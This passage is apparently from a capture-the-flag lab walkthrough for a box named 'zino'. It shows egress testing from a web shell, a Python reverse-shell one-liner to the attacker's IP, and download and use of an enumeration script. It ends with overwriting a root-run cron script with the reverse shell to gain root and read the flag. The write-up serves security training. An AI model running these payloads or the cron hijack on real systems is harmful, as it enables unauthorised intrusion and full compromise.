-rw------- 1 peter  peter      0 Apr 28  2020 .bash_history
-rw-r--r-- 1 peter  peter    220 Apr 28  2020 .bash_logout
-rw-r--r-- 1 peter  peter   3526 Apr 28  2020 .bashrc
drwx------ 3 peter  peter   4096 Apr 28  2020 .gnupg
-rw-r--r-- 1 peter  peter    807 Apr 28  2020 .profile
-rw-r--r-- 1 peter  peter   5464 Apr 28  2020 access.log
-rw-r--r-- 1 peter  peter    368 Apr 28  2020 auth.log
-rw-r--r-- 1 peter  peter    265 Apr 28  2020 error.log
dr-xr-xr-x 2 nobody nogroup 4096 Apr 28  2020 ftp
-rw-r--r-- 1 peter  peter     33 Jan 29 08:17 local.txt
-rw-r--r-- 1 peter  peter    424 Apr 28  2020 misc.log

$ ls -al /var/www/
total 12
drwxr-xr-x  3 root root 4096 Apr 28  2020 .
drwxr-xr-x 12 root root 4096 Apr 28  2020 ..
drwxr-xr-x  3 root root 4096 Apr 28  2020 html

$ ls /usr/bin | grep curl

$ ls /usr/bin | grep wget
wget

$ wget 192.168.49.162:8003 -O /tmp/t &

$ 
```

Only Port 8003 works (Port of the web server)
```
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 443                                                                                                                                 1 ⨯
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 8003
Serving HTTP on 0.0.0.0 port 8003 (http://0.0.0.0:8003/) ...
192.168.162.64 - - [29/Jan/2022 09:35:33] "GET / HTTP/1.1" 200 -


```

## Reverse Shell

On the Web Shell

```
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

```

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 8003       
listening on [any] 8003 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.64] 33574
www-data@zino:/var/www/html/booked/Web$ cd /home/peter
cd /home/peter
www-data@zino:/home/peter$ cat local.txt
cat local.txt
815569a957362a5b978b2b0853cbe43d
www-data@zino:/home/peter$ /sbin/ifconfig
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.162.64  netmask 255.255.255.0  broadcast 192.168.162.255
        ether 00:50:56:ba:92:a1  txqueuelen 1000  (Ethernet)
        RX packets 527555  bytes 59014433 (56.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 255298  bytes 116979794 (111.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1966  bytes 350662 (342.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1966  bytes 350662 (342.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@zino:/home/peter$ 

www-data@zino:/home/peter$ history
history
    1  cd /home/peter
    2  cat local.txt
    3  /sbin/ifconfig
    4  history
www-data@zino:/home/peter$
```

![](Pasted%20image%2020220129223821.png)

# Privesc

## Enum

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8003                                 
Serving HTTP on 0.0.0.0 port 8003 (http://0.0.0.0:8003/) ...
192.168.162.64 - - [29/Jan/2022 09:38:50] "GET /lse.sh HTTP/1.1" 200 -
```

```
www-data@zino:/home/peter$ cd /tmp
cd /tmp
www-data@zino:/tmp$ ls
ls
t
www-data@zino:/tmp$ wget 192.168.49.162:8003/lse.sh
wget 192.168.49.162:8003/lse.sh
--2022-01-29 09:37:31--  http://192.168.49.162:8003/lse.sh
Connecting to 192.168.49.162:8003... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh              100%[===================>]  42.55K   124KB/s    in 0.3s    

2022-01-29 09:37:32 (124 KB/s) - ‘lse.sh’ saved [43570/43570]

www-data@zino:/tmp$ chmod +x lse.sh
chmod +x lse.sh
www-data@zino:/tmp$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          

---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: www-data
     User ID: 33
    Password: none
        Home: /var/www
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
       umask: 0022

    Hostname: zino
       Linux: 4.19.0-8-amd64
Distribution: Debian GNU/Linux 10 (buster)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'www-data' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'www-data'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. nope
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
www-data@zino:/tmp$
```

## Check & Modify Writable Script

```
www-data@zino:/tmp$ cd /var/www/html/booked/          
cd /var/www/html/booked/
www-data@zino:/var/www/html/booked$ cat cleanup.py
cat cleanup.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /var/www/html/booked/uploads/reservation/* ')
except:
        print 'ERROR...'
sys.exit(0)
www-data@zino:/var/www/html/booked$ cp cleanup.py cleanup.py.bak
cp cleanup.py cleanup.py.bak
www-data@zino:/var/www/html/booked$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > cleanup.py
<2);import pty; pty.spawn("/bin/bash")' > cleanup.py
www-data@zino:/var/www/html/booked$ 
```


```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 8003                                               
listening on [any] 8003 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.64] 33612
root@zino:~# cd /root
cd /root
root@zino:~# ls
ls
proof.txt
root@zino:~# cat proof.txt
cat proof.txt
af940ebb83f63cf9d0835893ca98cea4
root@zino:~# /sbin/ifconfig
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.162.64  netmask 255.255.255.0  broadcast 192.168.162.255
        ether 00:50:56:ba:92:a1  txqueuelen 1000  (Ethernet)
        RX packets 548730  bytes 62382384 (59.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 276378  bytes 126886411 (121.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1966  bytes 350662 (342.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1966  bytes 350662 (342.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@zino:~# 
```

![](Pasted%20image%2020220129224428.png)

# Others

